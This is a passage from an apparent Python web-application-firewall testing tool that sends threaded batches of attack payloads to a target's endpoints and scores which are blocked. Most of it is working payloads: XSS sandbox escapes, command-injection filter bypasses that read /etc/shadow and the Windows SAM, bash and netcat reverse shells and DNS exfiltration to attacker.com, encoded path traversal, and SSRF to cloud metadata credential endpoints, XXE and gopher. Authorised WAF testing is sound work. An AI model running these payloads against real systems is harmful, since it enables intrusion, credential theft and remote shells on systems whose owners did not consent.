             'payload': 'q={{{}[{toString:[].join,length:1,0:\'__proto__\'}].assign=[].join;\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)//\');}}',
             'description': 'AngularJS prototype pollution', 'severity': Severity.CRITICAL,
             'bypass': 'Prototype pollution'},
            
            # Click-based attacks
            {'method': 'GET', 'endpoint': '/', 'type': 'XSS - Click',
             'payload': 'q=<input accesskey=X onclick="self[\'wind\'+\'ow\'][\'one\'+\'rror\']=alert;throw 1337;">',
             'description': 'Access key trigger XSS', 'severity': Severity.MEDIUM},
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for payload in xss_payloads:
                future = executor.submit(
                    self.test_payload,
                    payload['method'], payload['endpoint'], payload['type'],
                    payload['payload'], payload['description'], payload['severity'],
                    None, payload.get('bypass', '')
                )
                futures.append(future)
                time.sleep(0.1)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Colors.RED}Thread error: {e}{Colors.RESET}")
    
    def run_advanced_command_injection_tests(self):
        """Advanced command injection with real-world scenarios"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}3. ADVANCED COMMAND INJECTION TESTS (80+ variants){Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        
        cmd_payloads = [
            # Basic separators
            {'method': 'GET', 'endpoint': f"/api{quote(';ls')}/test", 'type': 'CMDi - Separator',
             'payload': '', 'description': 'Semicolon command separator', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': f"/api{quote('|ls')}/test", 'type': 'CMDi - Separator',
             'payload': '', 'description': 'Pipe command separator', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': f"/api{quote('&ls')}/test", 'type': 'CMDi - Separator',
             'payload': '', 'description': 'Ampersand separator', 'severity': Severity.CRITICAL},
            
            # Command substitution
            {'method': 'GET', 'endpoint': f"/api{quote('$(whoami)')}/test", 'type': 'CMDi - Substitution',
             'payload': '', 'description': 'Dollar substitution', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': f"/api{quote('`whoami`')}/test", 'type': 'CMDi - Substitution',
             'payload': '', 'description': 'Backtick substitution', 'severity': Severity.CRITICAL},
            
            # Shellshock
            {'method': 'GET', 'endpoint': f"/api{quote('() { :;}; /bin/bash -c whoami')}/test", 'type': 'CMDi - Shellshock',
             'payload': '', 'description': 'Shellshock CVE-2014-6271', 'severity': Severity.CRITICAL},
            
            # Wildcard bypasses from your payloads
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Wildcard',
             'payload': 'host=cat /???/??ss??',
             'description': 'Wildcard /etc/passwd', 'severity': Severity.CRITICAL,
             'bypass': 'Wildcard globbing'},
            
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Wildcard',
             'payload': 'host=cat /e??/p?????',
             'description': 'Wildcard pattern matching', 'severity': Severity.CRITICAL,
             'bypass': 'Wildcard pattern'},
            
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Wildcard',
             'payload': 'host=/???/??t+/???/??ss??',
             'description': 'Plus-separated wildcards', 'severity': Severity.CRITICAL,
             'bypass': 'Wildcard + plus'},
            
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Wildcard',
             'payload': 'host=/?in/cat+/et?/passw?',
             'description': 'Mixed wildcard patterns', 'severity': Severity.CRITICAL,
             'bypass': 'Complex wildcard'},
            
            # Quote bypasses
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Quote',
             'payload': 'host=cat /etc/pa\'ss\'wd',
             'description': 'Single quote bypass', 'severity': Severity.CRITICAL,
             'bypass': 'Quote escaping'},
            
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Quote',
             'payload': 'host=cat /etc/pa"ss"wd',
             'description': 'Double quote bypass', 'severity': Severity.CRITICAL,
             'bypass': 'Quote escaping'},
            
            # Brace expansion
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Brace',
             'payload': 'host=cat /e{t,}c/passw{d,}',
             'description': 'Brace expansion bypass', 'severity': Severity.CRITICAL,
             'bypass': 'Brace expansion'},
            
            # Variable manipulation
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Variable',
             'payload': 'host=;+$u+cat+/etc$u/passwd$u',
             'description': 'Empty variable insertion', 'severity': Severity.CRITICAL,
             'bypass': 'Variable expansion'},
            
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Variable',
             'payload': 'host=;+$u+cat+/etc$u/passwd+\\#',
             'description': 'Variable with comment', 'severity': Severity.CRITICAL,
             'bypass': 'Variable + comment'},
            
            # IFS manipulation
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - IFS',
             'payload': 'host=cat$IFS/etc$IFS/passwd',
             'description': 'IFS variable as space', 'severity': Severity.CRITICAL,
             'bypass': 'IFS variable'},
            
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - IFS',
             'payload': 'host=cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??',
             'description': 'Complex IFS with parameter expansion', 'severity': Severity.CRITICAL,
             'bypass': 'Advanced IFS'},
            
            # Base64 encoding
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Base64',
             'payload': 'cmd=' + base64.b64encode(b'cat /etc/passwd').decode(),
             'description': 'Base64 encoded command', 'severity': Severity.HIGH,
             'bypass': 'Base64 encoding'},
            
            # Reverse string execution
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Reverse',
             'payload': 'cmd=$(printf \'hsab/nib/ e- 4321 1.0.0.721 cn\'|rev)',
             'description': 'Reverse string execution', 'severity': Severity.CRITICAL,
             'bypass': 'String reversal'},
            
            # Newline injection
            {'method': 'GET', 'endpoint': f"/api{quote('%0als')}/test", 'type': 'CMDi - Newline',
             'payload': '', 'description': 'Newline character injection', 'severity': Severity.CRITICAL,
             'bypass': 'Newline injection'},
            
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Newline',
             'payload': 'cmd=%0a ls -la',
             'description': 'URL-encoded newline', 'severity': Severity.CRITICAL,
             'bypass': 'URL newline'},
            
            # Blind command injection
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Blind',
             'payload': 'host=127.0.0.1||sleep 10',
             'description': 'Blind time-based injection', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Blind',
             'payload': 'host=127.0.0.1;nslookup attacker.com',
             'description': 'Blind DNS exfiltration', 'severity': Severity.CRITICAL},
            
            # OS-specific commands
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Linux',
             'payload': 'host=127.0.0.1;cat /etc/passwd',
             'description': 'Linux password file', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Linux',
             'payload': 'host=127.0.0.1;cat /etc/shadow',
             'description': 'Linux shadow file', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Windows',
             'payload': 'host=127.0.0.1&type C:\\Windows\\System32\\config\\SAM',
             'description': 'Windows SAM file', 'severity': Severity.CRITICAL},
            
            # File operations
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - File Write',
             'payload': 'file=test;echo malicious > /tmp/backdoor',
             'description': 'File write operation', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - File Read',
             'payload': 'file=;cat /var/log/auth.log',
             'description': 'Auth log file read', 'severity': Severity.CRITICAL},
            
            # Environment variables
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Env Var',
             'payload': 'cmd=$PATH',
             'description': 'PATH environment variable', 'severity': Severity.HIGH},
            
            # Reverse shells
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Reverse Shell',
             'payload': 'cmd=;bash -i >& /dev/tcp/attacker.com/4444 0>&1',
             'description': 'Bash reverse shell', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Reverse Shell',
             'payload': 'cmd=;nc attacker.com 4444 -e /bin/sh',
             'description': 'Netcat reverse shell', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Reverse Shell',
             'payload': 'cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ipAddress/port%200%3E%261%27',
             'description': 'URL-encoded bash reverse shell', 'severity': Severity.CRITICAL,
             'bypass': 'URL encoding'},
            
            # Inline execution
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Inline',
             'payload': 'cmd=test$(id)test',
             'description': 'Inline command execution', 'severity': Severity.CRITICAL},
            
            # Tilde expansion
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Tilde',
             'payload': 'file=~/.ssh/id_rsa',
             'description': 'SSH key access via tilde', 'severity': Severity.CRITICAL},
            
            # Process substitution
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Process Sub',
             'payload': 'cmd=cat <(ls -la)',
             'description': 'Process substitution', 'severity': Severity.HIGH},
            
            # Null byte
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Null Byte',
             'payload': quote('file=test.txt\x00;ls'),
             'description': 'Null byte command injection', 'severity': Severity.CRITICAL,
             'bypass': 'Null byte'},
            
            # Command chaining
            {'method': 'GET', 'endpoint': '/api/ping', 'type': 'CMDi - Chaining',
             'payload': 'host=127.0.0.1&&whoami&&id',
             'description': 'Multiple command chaining', 'severity': Severity.CRITICAL},
            
            # Redirection
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Redirection',
             'payload': 'cmd=ls > /tmp/out.txt',
             'description': 'Output redirection', 'severity': Severity.HIGH},
            
            # Background execution
            {'method': 'GET', 'endpoint': '/api/test', 'type': 'CMDi - Background',
             'payload': 'cmd=sleep 100 &',
             'description': 'Background process execution', 'severity': Severity.HIGH},
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for payload in cmd_payloads:
                future = executor.submit(
                    self.test_payload,
                    payload['method'], payload['endpoint'], payload['type'],
                    payload['payload'], payload['description'], payload['severity'],
                    None, payload.get('bypass', '')
                )
                futures.append(future)
                time.sleep(0.1)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Colors.RED}Thread error: {e}{Colors.RESET}")
    
    def run_advanced_path_traversal_tests(self):
        """Advanced path traversal with encoding bypasses"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}4. ADVANCED PATH TRAVERSAL TESTS (50+ variants){Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        
        path_payloads = [
            # Basic traversal
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Basic',
             'payload': 'path=../../../../etc/passwd',
             'description': 'Basic Unix path traversal', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Basic',
             'payload': 'path=..\\..\\..\\..\\windows\\system32\\config\\sam',
             'description': 'Basic Windows path traversal', 'severity': Severity.HIGH},
            
            # URL encoding from your payloads
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - URL Encoded',
             'payload': 'path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
             'description': 'URL-encoded path traversal', 'severity': Severity.HIGH,
             'bypass': 'URL encoding'},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - URL Encoded',
             'payload': 'path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500',
             'description': 'URL encoded with null byte', 'severity': Severity.HIGH,
             'bypass': 'URL + null byte'},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - URL Encoded',
             'payload': 'path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%3F',
             'description': 'URL encoded with question mark', 'severity': Severity.HIGH,
             'bypass': 'URL + query bypass'},
            
            # Double encoding
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Double Encoded',
             'payload': 'path=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
             'description': 'Double URL encoding', 'severity': Severity.HIGH,
             'bypass': 'Double encoding'},
            
            # Unicode encoding
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Unicode',
             'payload': 'path=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
             'description': 'Unicode-encoded slashes', 'severity': Severity.HIGH,
             'bypass': 'Unicode encoding'},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Unicode',
             'payload': 'path=%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd',
             'description': 'Overlong UTF-8 encoding', 'severity': Severity.HIGH,
             'bypass': 'Overlong UTF-8'},
            
            # Null byte
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Null Byte',
             'payload': quote('path=../../../../etc/passwd\x00.jpg'),
             'description': 'Null byte extension bypass', 'severity': Severity.HIGH,
             'bypass': 'Null byte'},
            
            # UNC paths
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - UNC',
             'payload': 'path=\\\\127.0.0.1\\c$\\windows\\system32\\config\\sam',
             'description': 'Windows UNC path', 'severity': Severity.HIGH},
            
            # Absolute paths
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Absolute',
             'payload': 'path=/etc/passwd',
             'description': 'Direct absolute path', 'severity': Severity.HIGH},
            
            # Dot-dot-slash variations
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Variation',
             'payload': 'path=....//....//....//etc/passwd',
             'description': 'Double dot-slash bypass', 'severity': Severity.HIGH,
             'bypass': 'Dot variation'},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Variation',
             'payload': 'path=../et*/pas**d',
             'description': 'Wildcard path traversal', 'severity': Severity.HIGH,
             'bypass': 'Wildcard'},
            
            # Case sensitivity
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Case',
             'payload': 'path=..\\..\\..\\WINDOWS\\system32\\config\\SAM',
             'description': 'Case sensitivity bypass', 'severity': Severity.HIGH,
             'bypass': 'Case mixing'},
            
            # Special files from your payloads
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Config',
             'payload': 'path=/etc/knockd.conf',
             'description': 'Knockd configuration file', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Config',
             'payload': 'path=/etc/issue',
             'description': 'System issue file', 'severity': Severity.MEDIUM},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Config',
             'payload': 'path=/etc/shadow',
             'description': 'Shadow password file', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Config',
             'payload': 'path=/etc/group',
             'description': 'Group file access', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Config',
             'payload': 'path=../../../../etc/nginx/nginx.conf',
             'description': 'Nginx configuration', 'severity': Severity.CRITICAL},
            
            # Proc filesystem
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Proc',
             'payload': 'path=/proc/self/environ',
             'description': 'Process environment variables', 'severity': Severity.HIGH},
            
            # Zip slip
            {'method': 'POST', 'endpoint': '/api/upload', 'type': 'Path Traversal - Zip Slip',
             'payload': {'filename': '../../../../../../tmp/evil.sh'},
             'description': 'Zip Slip vulnerability', 'severity': Severity.CRITICAL},
            
            # Symbolic links
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Symlink',
             'payload': 'path=/var/www/html/uploads/symlink',
             'description': 'Symbolic link traversal', 'severity': Severity.HIGH},
            
            # File protocol
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - File Protocol',
             'payload': 'path=file:///etc/passwd',
             'description': 'File protocol wrapper', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - File Protocol',
             'payload': 'path=file:/etc/passwd?/',
             'description': 'File protocol with query bypass', 'severity': Severity.HIGH,
             'bypass': 'Query bypass'},
            
            # Advanced bypasses
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Advanced',
             'payload': 'path=/foo/../etc/bar/../passwd',
             'description': 'Mixed path segments', 'severity': Severity.HIGH,
             'bypass': 'Path confusion'},
            
            {'method': 'GET', 'endpoint': '/api/file', 'type': 'Path Traversal - Advanced',
             'payload': 'path=file:///etc/?/../passwd',
             'description': 'File protocol with traversal', 'severity': Severity.HIGH,
             'bypass': 'Protocol + traversal'},
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for payload in path_payloads:
                future = executor.submit(
                    self.test_payload,
                    payload['method'], payload['endpoint'], payload['type'],
                    payload['payload'], payload['description'], payload['severity'],
                    None, payload.get('bypass', '')
                )
                futures.append(future)
                time.sleep(0.1)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Colors.RED}Thread error: {e}{Colors.RESET}")
    
    def run_advanced_ssrf_tests(self):
        """Advanced SSRF with cloud metadata and protocol smuggling"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}5. ADVANCED SSRF TESTS (40+ variants){Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*100}{Colors.RESET}")
        
        ssrf_payloads = [
            # AWS metadata
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - AWS Metadata',
             'payload': 'url=http://169.254.169.254/latest/meta-data/',
             'description': 'AWS EC2 metadata endpoint', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - AWS Metadata',
             'payload': 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
             'description': 'AWS IAM credentials theft', 'severity': Severity.CRITICAL},
            
            # Azure metadata
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - Azure Metadata',
             'payload': 'url=http://169.254.169.254/metadata/instance?api-version=2021-02-01',
             'description': 'Azure metadata API', 'severity': Severity.CRITICAL},
            
            # GCP metadata
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - GCP Metadata',
             'payload': 'url=http://metadata.google.internal/computeMetadata/v1/',
             'description': 'GCP metadata endpoint', 'severity': Severity.CRITICAL},
            
            # Internal services
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - Internal Port',
             'payload': 'url=http://localhost:22',
             'description': 'Internal SSH port scan', 'severity': Severity.HIGH},
            
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - Internal Redis',
             'payload': 'url=http://127.0.0.1:6379',
             'description': 'Internal Redis access', 'severity': Severity.CRITICAL},
            
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - Internal MongoDB',
             'payload': 'url=http://localhost:27017',
             'description': 'Internal MongoDB access', 'severity': Severity.CRITICAL},
            
            # File protocol
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - File Protocol',
             'payload': 'url=file:///etc/passwd',
             'description': 'File protocol SSRF', 'severity': Severity.HIGH},
            
            # Dict protocol
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - Dict Protocol',
             'payload': 'url=dict://localhost:11211/stats',
             'description': 'Dict protocol Memcached', 'severity': Severity.HIGH},
            
            # Gopher protocol
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - Gopher',
             'payload': 'url=gopher://localhost:6379/_SET%20test%20value',
             'description': 'Gopher protocol Redis attack', 'severity': Severity.CRITICAL},
            
            # DNS rebinding
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - DNS Rebinding',
             'payload': 'url=http://rebind.it/169.254.169.254/',
             'description': 'DNS rebinding attack', 'severity': Severity.CRITICAL},
            
            # IP bypass techniques
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - IP Bypass',
             'payload': 'url=http://2130706433/',
             'description': 'Decimal IP notation (127.0.0.1)', 'severity': Severity.HIGH,
             'bypass': 'Decimal IP'},
            
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - IP Bypass',
             'payload': 'url=http://0x7f000001/',
             'description': 'Hexadecimal IP notation', 'severity': Severity.HIGH,
             'bypass': 'Hex IP'},
            
            # URL encoding bypass
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - URL Encoded',
             'payload': 'url=http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/',
             'description': 'URL-encoded IP address', 'severity': Severity.HIGH,
             'bypass': 'URL encoding'},
            
            # IPv6 localhost
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - IPv6',
             'payload': 'url=http://[::1]:80/',
             'description': 'IPv6 localhost notation', 'severity': Severity.HIGH,
             'bypass': 'IPv6'},
            
            # URL fragment bypass
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - Fragment',
             'payload': 'url=http://evil.com#@169.254.169.254/',
             'description': 'URL fragment confusion', 'severity': Severity.HIGH,
             'bypass': 'Fragment bypass'},
            
            # Open redirect chain
            {'method': 'GET', 'endpoint': '/api/fetch', 'type': 'SSRF - Redirect Chain',
             'payload': 'url=http://victim.com/redirect?url=http://169.254.169.254/',
             'description': 'Open redirect SSRF chain', 'severity': Severity.CRITICAL,
             'bypass': 'Redirect chain'},
            
            # PDF generator SSRF
            {'method': 'POST', 'endpoint': '/api/generate-pdf', 'type': 'SSRF - PDF',
             'payload': {'html': '<iframe src="http://169.254.169.254/"></iframe>'},
             'description': 'PDF generator SSRF', 'severity': Severity.CRITICAL},
            
            # XXE to SSRF
            {'method': 'POST', 'endpoint': '/api/xml', 'type': 'SSRF - XXE',
             'payload': {'xml': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>'},
             'description': 'XXE to SSRF escalation', 'severity': Severity.CRITICAL},
            
            # Webhook SSRF
            {'method': 'POST', 'endpoint': '/api/webhook', 'type': 'SSRF - Webhook',
             'payload': {'url': 'http://169.254.169.254/latest/meta-data/'},
             'description': 'Webhook SSRF exploitation', 'severity': Severity.CRITICAL},
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for payload in ssrf_payloads:
                future = executor.submit(
                    self.test_payload,
                    payload['method'], payload['endpoint'], payload['type'],
                    payload['payload'], payload['description'], payload['severity'],
                    None, payload.get('bypass', '')
                )
                futures.append(future)
                time.sleep(0.1)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Colors.RED}Thread error: {e}{Colors.RESET}")
    
    def calculate_risk_score(self):
        """Calculate overall risk score"""
        if len(self.results['allowed']) == 0:
            return 0
        
        total_risk = sum(attack.get('severity_level', 0) for attack in self.results['allowed'])
        total_risk += sum(attack.get('severity_level', 0) for attack in self.results['suspicious'])
        
        max_risk_per_attack = Severity.CRITICAL['level']
        total_attacks = len(self.results['allowed']) + len(self.results['suspicious'])
        max_possible_risk = total_attacks * max_risk_per_attack
        
        risk_percentage = (total_risk / max_possible_risk) * 100 if max_possible_risk > 0 else 0
        return risk_percentage
    
    def print_summary(self):
        """Print comprehensive test summary"""
        print(f"\n{Colors.BOLD}{'='*100}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}COMPREHENSIVE TEST SUMMARY{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*100}{Colors.RESET}\n")
        
        elapsed_time = time.time() - self.stats['start_time']
        
        print(f"Total Tests: {Colors.BOLD}{self.stats['total_tests']}{Colors.RESET}")
        print(f"Duration: {Colors.CYAN}{elapsed_time:.2f}s{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Blocked (GOOD): {self.stats['blocked_count']}{Colors.RESET}")
        print(f"{Colors.RED}❌ Allowed (BAD): {self.stats['allowed_count']}{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️  Suspicious: {len(self.results['suspicious'])}{Colors.RESET}")
        print(f"{Colors.YELLOW}⏱️  Timeouts: {self.stats['timeout_count']}{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️  Errors: {self.stats['error_count']}{Colors.RESET}")
        
        if self.stats['allowed_count'] > 0 or len(self.results['suspicious']) > 0:
            print(f"\n{Colors.RED}{Colors.BOLD}🚨 CRITICAL: {self.stats['allowed_count']} ATTACKS BYPASSED WAF!{Colors.RESET}")
            
            # Data leak analysis
            if len(self.results['suspicious']) > 0:
                print(f"\n{Colors.RED}{Colors.BOLD}💀 DATA LEAK DETECTED: {len(self.results['suspicious'])} responses with sensitive data!{Colors.RESET}")
            
            print(f"\n{Colors.BOLD}Bypassed Attacks by Severity:{Colors.RESET}")
            
            by_severity = {
                'CRITICAL': [],
                'HIGH': [],
                'MEDIUM': [],
                'LOW': [],
                'INFO': []
            }
            
            for attack in self.results['allowed'] + self.results['suspicious']:
                severity = attack.get('severity', 'UNKNOWN')
                by_severity[severity].append({
                    'type': attack.get('payload_type', 'Unknown'),
                    'description': attack.get('description', 'No description'),
                    'bypass': attack.get('bypass_technique', '')
                })
            
            for sev_name in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
                attacks = by_severity[sev_name]
                if attacks:
                    sev_obj = getattr(Severity, sev_name)
                    print(f"\n  {self.get_severity_display(sev_obj)} ({len(attacks)} attacks):")
                    for attack in attacks[:10]:  # Limit display
                        bypass_info = f" [{Colors.MAGENTA}{attack['bypass']}{Colors.RESET}]" if attack['bypass'] else ""
                        print(f"    - [{attack['type']}] {attack['description']}{bypass_info}")
                    if len(attacks) > 10:
                        print(f"    ... and {len(attacks) - 10} more")
            
            risk_score = self.calculate_risk_score()
            print(f"\n{Colors.BOLD}Risk Score: {Colors.RED}{risk_score:.1f}%{Colors.RESET}")
            
            if risk_score >= 80:
                print(f"{Colors.RED}{Colors.BOLD}⚠️  EXTREME RISK: Immediate remediation required!{Colors.RESET}")
            elif risk_score >= 60:
                print(f"{Colors.RED}⚠️  HIGH RISK: Urgent security fixes needed{Colors.RESET}")
            elif risk_score >= 40:
                print(f"{Colors.YELLOW}⚠️  MODERATE RISK: Address vulnerabilities soon{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}⚠️  LOW RISK: Monitor and improve security posture{Colors.RESET}")
        
        if self.stats['blocked_count'] > 0:
            print(f"\n{Colors.BOLD}Successfully Blocked Attack Categories:{Colors.RESET}")
            
            by_category = {}
            for attack in self.results['blocked']:
                category = attack.get('payload_type', 'Unknown').split('-')[0].strip()
                if category not in by_category:
                    by_category[category] = 0
                by_category[category] += 1
            
            for category, count in sorted(by_category.items(), key=lambda x: x[1], reverse=True):
                print(f"  - {Colors.GREEN}{category}{Colors.RESET}: {count} attacks blocked")
        
        if self.stats['total_tests'] > 0:
            score = (self.stats['blocked_count'] / self.stats['total_tests']) * 100
            print(f"\n{Colors.BOLD}{'='*100}{Colors.RESET}")
            print(f"{Colors.BOLD}Security Score: {score:.1f}%{Colors.RESET}")
            
            if score >= 95:
                print(f"{Colors.GREEN}{Colors.BOLD}Rating: EXCELLENT 🛡️🛡️🛡️{Colors.RESET}")
                print(f"{Colors.GREEN}WAF is performing excellently! Minimal bypasses detected.{Colors.RESET}")
            elif score >= 85:
                print(f"{Colors.GREEN}{Colors.BOLD}Rating: VERY GOOD 🛡️🛡️{Colors.RESET}")
                print(f"{Colors.YELLOW}Good protection, but some improvements recommended.{Colors.RESET}")
            elif score >= 70:
                print(f"{Colors.YELLOW}{Colors.BOLD}Rating: GOOD ⚠️{Colors.RESET}")
                print(f"{Colors.YELLOW}Acceptable protection, but notable security gaps exist.{Colors.RESET}")
            elif score >= 50:
                print(f"{Colors.RED}{Colors.BOLD}Rating: POOR 🔴{Colors.RESET}")
                print(f"{Colors.RED}Significant vulnerabilities detected. Immediate action required.{Colors.RESET}")
            else:
                print(f"{Colors.RED}{Colors.BOLD}Rating: CRITICAL 💀{Colors.RESET}")
                print(f"{Colors.RED}WAF is ineffective. System is highly vulnerable to attacks.{Colors.RESET}")
            
            print(f"{Colors.BOLD}{'='*100}{Colors.RESET}")
        
        # Save detailed report
        report = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'duration_seconds': elapsed_time,
            'summary': {
                'total': self.stats['total_tests'],
                'blocked': self.stats['blocked_count'],
                'allowed': self.stats['allowed_count'],
                'suspicious': len(self.results['suspicious']),
                'timeouts': self.stats['timeout_count'],
                'errors': self.stats['error_count'],
                'security_score': f"{score:.1f}%" if self.stats['total_tests'] > 0 else "N/A",
                'risk_score': f"{self.calculate_risk_score():.1f}%"
            },
            'severity_breakdown': {
                'critical': len([a for a in self.results['allowed'] + self.results['suspicious'] if a.get('severity') == 'CRITICAL']),
                'high': len([a for a in self.results['allowed'] + self.results['suspicious'] if a.get('severity') == 'HIGH']),
                'medium': len([a for a in self.results['allowed'] + self.results['suspicious'] if a.get('severity') == 'MEDIUM']),
                'low': len([a for a in self.results['allowed'] + self.results['suspicious'] if a.get('severity') == 'LOW'])
            },
